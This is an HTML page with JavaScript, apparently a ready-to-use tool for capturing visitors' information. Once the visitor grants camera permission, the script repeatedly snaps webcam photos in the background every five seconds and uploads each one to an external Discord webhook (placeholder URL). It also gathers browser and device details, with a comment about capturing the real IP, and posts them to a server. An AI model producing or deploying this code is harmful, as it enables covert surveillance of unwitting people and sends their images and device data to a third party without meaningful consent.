<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informações do Usuário</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        .content {
            text-align: center;
            margin-top: 50px;
        }
    </style>
</head>
<body>
    <div class="content">
        <h1>Capturar Informações do Usuário</h1>
        <button id="getPermission">Permitir Acesso à Câmera</button>
        <button id="sendInfo">Enviar Informações</button>
        <p id="status"></p>
    </div>

    <script>
        let userInfo = {};

        // Função para pegar informações do usuário
        function getUserInfo() {
            const ip = '192.168.0.1'; // Use API de IP para capturar o IP real
            const deviceInfo = navigator.userAgent;
            const browser = navigator.appName;
            
            userInfo = { ip, deviceInfo, browser };
        }

        // Permissão para câmera
        document.getElementById('getPermission').addEventListener('click', function() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    document.getElementById('status').innerText = "Permissão Concedida. Capturando fotos...";
                    capturePhoto(stream);
                })
                .catch(function(err) {
                    document.getElementById('status').innerText = "Permissão Negada!";
                });
        });

        // Captura a foto a cada 5 segundos
        function capturePhoto(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            setInterval(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(blob => {
                    sendPhotoToWebhook(blob);
                }, 'image/jpeg');
            }, 5000);
        }

        // Envia a foto para o webhook
        function sendPhotoToWebhook(blob) {
            const formData = new FormData();
            formData.append('file', blob);

            fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_URL', {
                method: 'POST',
                body: formData
            }).then(response => response.json())
              .then(data => console.log('Imagem enviada para o webhook:', data))
              .catch(error => console.error('Erro ao enviar imagem:', error));
        }

        // Envia as informações coletadas para o backend
        document.getElementById('sendInfo').addEventListener('click', function() {
            getUserInfo();

            fetch('/send-info', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(userInfo)
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('status').innerText = "Informações enviadas com sucesso!";
            })
            .catch(error => {
                document.getElementById('status').innerText = "Erro ao enviar informações.";
                console.error('Erro:', error);
            });
        });
    </script>
</body>
</html>
